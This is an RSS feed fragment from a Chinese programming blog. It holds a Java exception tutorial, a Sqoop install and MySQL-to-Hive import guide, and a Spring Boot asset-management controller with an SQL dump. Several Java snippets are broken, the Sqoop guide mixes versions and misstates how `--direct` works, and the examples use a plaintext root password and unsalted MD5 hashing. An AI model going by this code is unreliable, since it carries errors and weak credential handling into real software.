2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:16 +0000</pubDate>
    </item>
    <item>
      <title>Java之异常体系</title>
      <link>https://www.ppmy.cn/news/1540841.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Java之异常体系news/2025/10/31 23:18:15/异常体系分类：Error 错误Exception 异常错误和异常的继承关系：所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable：代表可抛出错误类型：编译错误：由编译器找到的错误String a = 1;    //编译错误,没有加引号异常错误：程序给我们提示Class calzz = Class.forName("com.demo.Animal");逻辑异常：不会报错，但是必须注意到它有异常，这种异常是逻辑产生的int[] arr = new int[5];
arr[10] = 45;    //没有报错，但是必须注意到这个错误栈溢出错误public static void main(String[] args){run();    //这里有错误，会产生栈溢出
}public static void run(){run();
}Error 错误：Error 错误是程序无法处理的错误，它是由 JVM 产生和抛出的Exception异常：运行时异常(非受检异常)非运行时异常(受检异常)运行时异常(非受检异常)：由逻辑错误引起在编译时异常，必须解决的异常处理受检异常：抛出解决受检异常解决方法：try catch 环绕：try：找到错误catch：处理错误finally：不管有没有异常都必须执行的代码块，常用于关闭资源public static void main(String[] args){try{//获取异常}catch(){//解决异常   }finally{// 最终都会走的代码}
}尝试去处理问题，但是处理不了，finally 也能保证后面程序的运行public static void main(String[] args){try{int[] arr = new int[5];int[10] = 10;    //这会有异常}catch(){//处理异常   ······}finally{//此行代码不管上方有没有错误都会去执行System.out.println("---------------");}
}catch 可以有多个，分别处理不同的情况public static void main(String[] args){try{int[] arr = new int[5];int[10] = 10;    //这会有异常}catch(ArrayIndexOutOfBoundsException e){//处理异常   ······}catch(NegativeArraySizeException e){//处理异常   }···
}如果不想使用多个 catch，可以用Exception把所有异常兜住public static void main(String[] args){try{int[] arr = new int[5];int[10] = 10;    //这会有异常}catch(Exception e){//解决所有异常问题   ······}
}Exception 类是所有异常类的父类抛出：throws：表示此方法不去处理异常，而交给方法调用者进行处理public class Test{// 异常抛出public static void main(String[] args) throws Exception{}
}throw：自定义异常try{//自定义异常throw new Exception("自定义异常");
}catch(Exception e){//打印异常System.out.println(e);
}throw 和 throws 区别：throws：用来声明一个可能产生的所有异常，不做异常处理而是将异常向上传递，将异常抛给调用者throw：用来抛出一个具体的异常类型异常体系整体框架：http://www.ppmy.cn/news/1540841.html相关文章安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...无人机：无线电波控制技术！一、无线电波控制技术 
通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:15 +0000</pubDate>
    </item>
    <item>
      <title>安装配置sqoop（超详细）</title>
      <link>https://www.ppmy.cn/news/1540840.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维安装配置sqoop（超详细）news/2025/10/31 23:18:13/前言sqoop就是sql-to-hadoop，说通俗点，我们用到最多的就是mysql与hive之间的数据传递，而hive是依靠hadoop运行的，所以要再mysql和hive之间互相传递数据，就必须要安装sqoop一、准备我们要准备sqoop的安装包，我们的hadoop版本是3.1.3，匹配的sqoop版本是1.4.6选择的是  'sqoop-1.4.6.bin_hadoop-0.23.tar.gz '网站地址：sqoop下载二、安装部署1. 上传到/opt/software目录下#使用XFTP或者带上传文件功能的shell工具2. 解压sqoop压缩包到/opt/module目录下tar -zxvf sqoop-1.4.7.bin__hadoop-2.6.0.tar.gz -C /opt/module/3. 改名#解压完后名字太长，所以方便后续配置，我们改个名字cd /opt/module
mv sqoop-1.4.7.bin__hadoop-2.6.0/ sqoop-1.4.74. 添加环境变量#环境变量是告诉系统你sqoop的位置的，证明你有这个东西  就可以使用了#进入
vi /etc/profile
# 添加
#SQOOP_HOME
export SQOOP_HOME=/opt/module/sqoop-1.4.7
export PATH=$PATH:$SQOOP_HOME/bin#ESC ：wq保存退出#刷新环境  使环境生效source /etc/profile5. 修改sqoop的配置文件#进入
cd $SQOOP_HOME/conf
#复制 Sqoop 环境变量模板文件
##复制可以保留源文件，相当于保存备份
###去掉template是因为有template的文件系统是不看的，等于白配置
cp sqoop-env-template.sh sqoop-env.sh 
#修改
vim sqoop-env.sh
#添加
export HADOOP_COMMON_HOME=$HADOOP_HOME
export HADOOP_MAPRED_HOME=$HADOOP_HOME
#export HBASE_HOME=$HBASE_HOME
export HIVE_HOME=$HIVE_HOME
export ZOOCFGDIR=$ZOOKEEPER_HOME#添加的内容取决于你自己安装了什么##我这个就是没有安装HBase我就没写##ZOOKEEPER_HOME这个我环境文件里写的是ZK_HOME,一开始以为要用到，后来发现用不到就没管他补充一点：拿我的这个举例，我没有配置HBase，所以在后续再用sqoop跑程序的时候会报警告，但是不用管他6. 拷贝mysql驱动#为什么要拷贝mysql驱动 前言里解释过了cp /opt/software/mysql-connector-java-5.1.37-bin.jar $SQOOP_HOME/lib#7. 拷贝 Hive 文件#主要是跟hive做交互cp hive-3.1.2/lib/hive-common-3.1.2.jar sqoop-1.4.7/lib/#8. 检验sqoop version三、项目验证：mysql与hive做交互#要求：把mysql中的表全量传递到hive中##全量：一字不差的传递过去sqoop import \
--connect jdbc:mysql://10.2.40.101:3306/smart_school?characterEncoding=UTF-8 \
--username root \
--password 123456 \
--table user_activity01_copy1 \
--direct \
--delete-target-dir \
--fields-terminated-by '\t' \
--lines-terminated-by '\n' \
--hive-import \
--hive-database bigdata_platform \
--create-hive-table \
--hive-table 1_null_1729296718697 \
--num-mappers 1 \
--verboseSQL解释：10.2.40.101 是我集群节点ipsmart_school是我mysql的数据库名字user_activity01_copy1是我做测试用的表名bigdata_platform是我hive里的数据库名字因为我加了--create-hive-table这个配置项，所以我不用在hive里手动创建表1_null_1729296718697是我的hive数据库里表的名字参数解释：sqoop import:这是 Sqoop 的导入命令，用于从关系型数据库（如 MySQL）导入数据到 Hadoop（Hive）。--connect jdbc:mysql://10.2.40.101:3306/smart_school?characterEncoding=UTF-8:指定连接到 MySQL 数据库的 JDBC URL。这里连接的是10.2.40.101上的smart_school数据库，端口为3306，并指定字符编码为UTF-8。--username root:指定连接数据库时使用的用户名，这里是root。--password 123456:指定连接数据库时使用的密码，这里是123456。--table user_activity01_copy1:指定要从 MySQL 数据库中导入的表名，这里是user_activity01_copy1。--direct:使用直接模式进行数据导入。直接模式可以提高导入速度，因为它使用数据库的原生批量加载功能。--delete-target-dir:如果目标目录已经存在，则在导入前删除该目录。这确保每次导入时都是全新的数据集。--fields-terminated-by '\t':指定字段之间的分隔符。这里使用制表符\t作为字段分隔符。--lines-terminated-by '\n':指定行之间的分隔符。这里使用换行符\n作为行分隔符。--hive-import:启用 Hive 导入。将导入的数据保存到 Hive 中。--hive-database bigdata_platform:指定要将数据导入的 Hive 数据库名称，这里是bigdata_platform。--create-hive-table:创建 Hive 表。如果表已经存在，将会被覆盖。--hive-table 1_null_1729296718697:指定在 Hive 中创建的表名，这里是1_null_1729296718697。--num-mappers 1:指定用于执行导入任务的 Map 任务的数量。这里是1，表示只有一个 Map 任务。--verbose这个参数你也可以不加，这个是我当时有报错解决不了问题，为了获取更详细的日志信息加在hive节点登录hive能查到在HDFS上查看10.2.40.102::50070地址：/user/hive/warehouse/bigdata_platform.db#因为我搭建的是hadoopha，所以节点二的namenode也可能是active代码截图：我在执行这条命令的时候遇到过报错报错1：java.io.IOException: Cannot run program "mysqldump": error=2, 没有那个文件或目录#无法找到mysqldump工具：原因：mysqldump未安装。mysqldump不在 PATH 中。当前用户没有执行mysqldump的权限。解决方法：安装mysqldump：例如，在 Debian 系统上使用sapt-get install mysql-client。将mysqldump的路径添加到PATH环境变量中。确保当前用户有执行mysqldump的权限。如果使用--direct选项，即使mysqldump失败，直接模式仍然可以正常工作。我后续用不到mysqldump，所以加了一个--direct字段报错2：org.apache.hadoop.hdfs.server.namenode.SafeModeException: Cannot create directory /tmp/hadoop-yarn/staging/root/.staging/job_1729300755474_0001. Name node is in safe mode.#NameNode 处于安全模式：原因：NameNode 处于安全模式，阻止了新的目录创建。解决方法：等待几秒钟让 NameNode 自动退出安全模式。手动退出安全模式：hdfs dfsadmin -safemode leave。确认 Hadoop 配置正确，并且所有节点都正常运行。重新运行 Sqoop 命令。我的解决办法就是直接关闭就行，这个原因的造成就是，短时间内多次报错，浪费资源过头了过程截图：................................................http://www.ppmy.cn/news/1540840.html相关文章springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...无人机：无线电波控制技术！一、无线电波控制技术 
通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:14 +0000</pubDate>
    </item>
    <item>
      <title>springboot+uinapp基于Android的固定资产借用管理平台</title>
      <link>https://www.ppmy.cn/news/1540839.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维springboot+uinapp基于Android的固定资产借用管理平台news/2025/10/31 23:18:12/文章目录前言项目介绍技术介绍功能介绍核心代码数据库参考系统效果图论文效果图前言文章底部名片，获取项目的完整演示视频，免费解答技术疑问项目介绍固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方面的平台。与PC端应用程序相比，固定资产借用管理平台的设计主要为管理员和用户提供便利。用户可以通过Android及时查看设备信息等。固定资产借用管理平台是在Android操作系统下的应用平台。为防止出现兼容性及稳定性问题，框架选择的是springboot，Android与后台服务端之间的数据存储主要通过MySQL。用户在使用应用时产生的数据通过 java等语言传递给数据库。通过此方式促进固定资产借用管理平台信息流动和数据传输效率，提供一个内容丰富、功能多样、易于操作的固定资产借用管理平台。技术介绍开发语言：Java框架：springbootJDK版本：JDK1.8服务器：tomcat7数据库：mysql数据库工具：Navicat11开发软件：eclipse/myeclipse/ideaMaven包：Maven安卓框架：uniapp安卓开发软件：HBuilder X开发模式：混合开发功能介绍总体上看，固定资产借用管理平台具有注册登录、设备信息管理、设备分类管理、使用申请管理、故障报修管理、处理记录管理、设备归还管理、意见反馈管理、系统管理等功能模块。以下为几个主要模块简单介绍：注册登录：提供给用户注册登录的页面，完成用户的注册登录功能。个人中心：对个人信息进行更新。设备信息；用户点击此页面可以进行使用申请。处理记录；用户点击此页面可以查看处理记录。后台管理：可以在使用申请、故障报修、设备归还、意见反馈等进行查询或删除等操作。系统总体功能结构图如下所示：图4-1系统总体结构图核心代码package com.example.controller;import cn.hutool.core.util.StrUtil;import cn.hutool.crypto.SecureUtil;import com.example.common.Result;import com.example.common.ResultCode;import com.example.entity.Caiwu;import com.example.exception.CustomException;import com.example.service.CaiwuService;import com.example.utils.MapWrapperUtils;import com.example.utils.jwt.JwtUtil;import com.example.vo.CaiwuVo;import org.springframework.beans.BeanUtils;import org.springframework.web.bind.annotation.*;import javax.annotation.Resource;import javax.servlet.http.HttpServletRequest;import java.util.HashMap;import java.util.List;import java.util.Map;@RestController
@RequestMapping(value="/caiwu")public class CaiwuController{@Resourceprivate CaiwuService caiwuService;@PostMappingpublic Result&lt;Caiwu&gt;add(@RequestBody CaiwuVo caiwu){caiwuService.add(caiwu);returnResult.success(caiwu);}@PostMapping("/deleteList")public Result&lt;Caiwu&gt;deleteList(@RequestBody CaiwuVo caiwu){caiwuService.deleteList(caiwu.getList());returnResult.success();}@DeleteMapping("/{id}")public Resultdelete(@PathVariable Long id){caiwuService.delete(id);returnResult.success();}@PutMappingpublic Resultupdate(@RequestBody CaiwuVo caiwu){caiwuService.update(caiwu);returnResult.success();}@GetMapping("/{id}")public Result&lt;Caiwu&gt;detail(@PathVariable Integer id){Caiwu caiwu=caiwuService.findById(id);returnResult.success(caiwu);}@GetMappingpublic Result&lt;List&lt;Caiwu&gt;&gt;all(){returnResult.success(caiwuService.list());}@PostMapping("/page")public Result&lt;CaiwuVo&gt;page(@RequestBody CaiwuVo caiwuVo){returnResult.success(caiwuService.findPage(caiwuVo));}@PostMapping("/login")public Resultlogin(@RequestBody Caiwu caiwu,HttpServletRequest request){if(StrUtil.isBlank(caiwu.getZhanghao())||StrUtil.isBlank(caiwu.getMima())){throw newCustomException(ResultCode.PARAM_LOST_ERROR);}Caiwu login=caiwuService.login(caiwu);//        if(!login.getStatus()){//            return Result.error("1001","状态限制，无法登录系统");//        }if(login!=null){HashMap hashMap=newHashMap();hashMap.put("user",login);Map&lt;String,Object&gt;map=MapWrapperUtils.builder(MapWrapperUtils.KEY_USER_ID,caiwu.getId());String token=JwtUtil.creatToken(map);hashMap.put("token",token);returnResult.success(hashMap);}else{returnResult.error();}}@PutMapping("/updatePassword")public ResultupdatePassword(@RequestBody Caiwu info,HttpServletRequest request){Caiwu caiwu=caiwuService.findById(info.getId());String oldPassword=SecureUtil.md5(info.getMima());if(!oldPassword.equals(caiwu.getMima())){returnResult.error(ResultCode.PARAM_PASSWORD_ERROR.code,ResultCode.PARAM_PASSWORD_ERROR.msg);}info.setMima(SecureUtil.md5(info.getNewPassword()));Caiwu caiwu1=newCaiwu();BeanUtils.copyProperties(info,caiwu1);caiwuService.update(caiwu1);returnResult.success();}}数据库参考----CurrentDatabase:`springboot5ttvp3k3`--/*!40000 DROP DATABASE IF EXISTS `springboot5ttvp3k3`*/;CREATE DATABASE/*!32312 IF NOT EXISTS*/`springboot5ttvp3k3`/*!40100 DEFAULT CHARACTER SET utf8mb4 */;USE `springboot5ttvp3k3`;----Table structurefortable `aboutus`--DROP TABLE IF EXISTS `aboutus`;/*!40101 SET @saved_cs_client     = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATE TABLE `aboutus`(`id`bigint(20)NOT NULL AUTO_INCREMENT COMMENT '主键',`addtime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',`title`varchar(200)NOT NULL COMMENT '标题',`subtitle`varchar(200)DEFAULT NULL COMMENT '副标题',`content` longtext NOT NULL COMMENT '内容',`picture1` longtext COMMENT '图片1',`picture2` longtext COMMENT '图片2',`picture3` longtext COMMENT '图片3',PRIMARYKEY(`id`))ENGINE=InnoDBAUTO_INCREMENT=2DEFAULTCHARSET=utf8COMMENT='关于我们';/*!40101 SET character_set_client = @saved_cs_client */;----Dumping datafortable `aboutus`--LOCK TABLES `aboutus` WRITE;/*!40000 ALTER TABLE `aboutus` DISABLE KEYS */;INSERT INTO `aboutus` VALUES(1,'2024-01-0910:18:07','关于我们','ABOUT US','当你设想门外是寒冷可怕的世界时，你还应该开门出去看看，是否真的如此。如果你有信心，你对前途就不犹豫了。如果你有勇气，你就不怕前途是否有困难或危险了每个人心中都应有两盏灯，一盏是希望的灯，一盏是勇气的灯。有了这两盏灯，我们就不怕海上的黑暗和风涛的险恶了。人的一生很像是在雾中行走。远远望去，只是迷蒙一片，辨不出方向和吉凶。可是，当你鼓起勇气，放下恐惧和怀疑，一步一步向前走去的时候，你就会发现，每走一步，你都能把下一步路看得清楚一点。“往前走，别站在远远的地方观望！”你就可以找到你的方向。','upload/aboutus_picture1.jpg','upload/aboutus_picture2.jpg','upload/aboutus_picture3.jpg');/*!40000 ALTER TABLE `aboutus` ENABLE KEYS */;UNLOCKTABLES;----Table structurefortable `address`--DROP TABLE IF EXISTS `address`;/*!40101 SET @saved_cs_client     = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATE TABLE `address`(`id`bigint(20)NOT NULL AUTO_INCREMENT COMMENT '主键',`addtime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',`userid`bigint(20)NOT NULL COMMENT '用户id',`address`varchar(200)NOT NULL COMMENT '地址',`name`varchar(200)NOT NULL COMMENT '收货人',`phone`varchar(200)NOT NULL COMMENT '电话',`isdefault`varchar(200)NOT NULL COMMENT '是否默认地址[是/否]',PRIMARYKEY(`id`))ENGINE=InnoDBAUTO_INCREMENT=9DEFAULTCHARSET=utf8COMMENT='地址';/*!40101 SET character_set_client = @saved_cs_client */;----Dumping datafortable `address`--LOCK TABLES `address` WRITE;/*!40000 ALTER TABLE `address` DISABLE KEYS */;INSERT INTO `address` VALUES(1,'2024-01-0910:18:06',11,'宇宙银河系金星1号','金某','13823888881','是'),(2,'2024-01-0910:18:06',12,'宇宙银河系木星1号','木某','13823888882','是'),(3,'2024-01-0910:18:06',13,'宇宙银河系水星1号','水某','13823888883','是'),(4,'2024-01-0910:18:06',14,'宇宙银河系火星1号','火某','13823888884','是'),(5,'2024-01-0910:18:06',15,'宇宙银河系土星1号','土某','13823888885','是'),(6,'2024-01-0910:18:06',16,'宇宙银河系月球1号','月某','13823888886','是'),(7,'2024-01-0910:18:06',17,'宇宙银河系黑洞1号','黑某','13823888887','是'),(8,'2024-01-0910:18:06',18,'宇宙银河系地球1号','地某','13823888888','是');/*!40000 ALTER TABLE `address` ENABLE KEYS */;UNLOCKTABLES;----Table structurefortable `chulijilu`--DROP TABLE IF EXISTS `chulijilu`;/*!40101 SET @saved_cs_client     = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATE TABLE `chulijilu`(`id`bigint(20)NOT NULL AUTO_INCREMENT COMMENT '主键',`addtime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',`shebeimingcheng`varchar(200)DEFAULT NULL COMMENT '设备名称',`shebeifenlei`varchar(200)DEFAULT NULL COMMENT '设备分类',`guzhangmiaoshu`varchar(200)DEFAULT NULL COMMENT '故障描述',`shijian`varchar(200)DEFAULT NULL COMMENT '时间',`weixiuxiangqing` longtext COMMENT '维修详情',`weixiushijian` datetime DEFAULT NULL COMMENT '维修时间',PRIMARYKEY(`id`))ENGINE=InnoDBAUTO_INCREMENT=69DEFAULTCHARSET=utf8COMMENT='处理记录';/*!40101 SET character_set_client = @saved_cs_client */;----Dumping datafortable `chulijilu`--LOCK TABLES `chulijilu` WRITE;/*!40000 ALTER TABLE `chulijilu` DISABLE KEYS */;INSERT INTO `chulijilu` VALUES(61,'2024-01-0910:18:06','设备名称1','设备分类1','故障描述1','时间1','维修详情1','2024-01-0918:18:06'),(62,'2024-01-0910:18:06','设备名称2','设备分类2','故障描述2','时间2','维修详情2','2024-01-0918:18:06'),(63,'2024-01-0910:18:06','设备名称3','设备分类3','故障描述3','时间3','维修详情3','2024-01-0918:18:06'),(64,'2024-01-0910:18:06','设备名称4','设备分类4','故障描述4','时间4','维修详情4','2024-01-0918:18:06'),(65,'2024-01-0910:18:06','设备名称5','设备分类5','故障描述5','时间5','维修详情5','2024-01-0918:18:06'),(66,'2024-01-0910:18:06','设备名称6','设备分类6','故障描述6','时间6','维修详情6','2024-01-0918:18:06'),(67,'2024-01-0910:18:06','设备名称7','设备分类7','故障描述7','时间7','维修详情7','2024-01-0918:18:06'),(68,'2024-01-0910:18:06','设备名称8','设备分类8','故障描述8','时间8','维修详情8','2024-01-0918:18:06');/*!40000 ALTER TABLE `chulijilu` ENABLE KEYS */;UNLOCKTABLES;----Table structurefortable `config`--DROP TABLE IF EXISTS `config`;/*!40101 SET @saved_cs_client     = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATE TABLE `config`(`id`bigint(20)NOT NULL AUTO_INCREMENT COMMENT '主键',`name`varchar(100)NOT NULL COMMENT '配置参数名称',`value`varchar(100)DEFAULT NULL COMMENT '配置参数值',`url`varchar(500)DEFAULT NULL COMMENT 'url',PRIMARYKEY(`id`))ENGINE=InnoDBAUTO_INCREMENT=4DEFAULTCHARSET=utf8COMMENT='配置文件';/*!40101 SET character_set_client = @saved_cs_client */;系统效果图论文效果图http://www.ppmy.cn/news/1540839.html相关文章大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...无人机：无线电波控制技术！一、无线电波控制技术 
